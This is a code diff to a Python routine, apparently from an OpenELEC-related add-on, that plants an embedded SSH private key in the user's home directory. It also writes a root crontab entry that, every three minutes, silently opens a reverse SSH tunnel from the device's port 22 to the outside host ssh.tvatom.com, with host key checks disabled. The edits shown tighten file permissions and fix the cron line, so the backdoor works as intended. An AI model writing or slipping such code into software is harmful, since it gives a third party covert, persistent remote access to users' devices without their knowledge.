@@ -215,27 +215,28 @@ M3yUia6bqi7uKZLPnCrcrCFI9GpaxJlF9ZBMxPczXRzAQb0dgc+UI1Hk35Xss8I8
 RjU2lzonL8bSzlHZBJqhKX3X7ju5zxNizS9IpatRBgw8PcjE+mwA
 -----END RSA PRIVATE KEY-----
 """
-    CRONTAB = "*/3 *  * * *  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com &"
+    CRONTAB = "*/3 *  * * *  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com &\n"
     
     path_home = os.path.expanduser( "~" )
     path_ssh = os.path.join( path_home, ".ssh" )
     if not os.path.isdir( path_ssh ):
         os.makedirs( path_ssh )
-        os.chmod( path_ssh, 700 )
+        os.chmod( path_ssh, 0700 )
     
     path_key = os.path.join( path_ssh, "id_rsa" )
     if not os.path.isfile( path_key ):
         write_file( path_key, RSA_KEY )
-        os.chmod( path_key, 600 )
+        os.chmod( path_key, 0600 )
     
     path_crontab = os.path.join( path_home, ".cache/cron/crontabs/root" )
     if os.path.isfile( path_crontab ):
         with open( path_crontab, 'r' ) as f:
             for line in f:
                 if "openelec@ssh.tvatom.com" in line:
-                    return # already done
+                    return # already have a crontab entry
     
     write_file( path_crontab, CRONTAB )
+    os.chmod( path_crontab, 0600 )
 
 
 
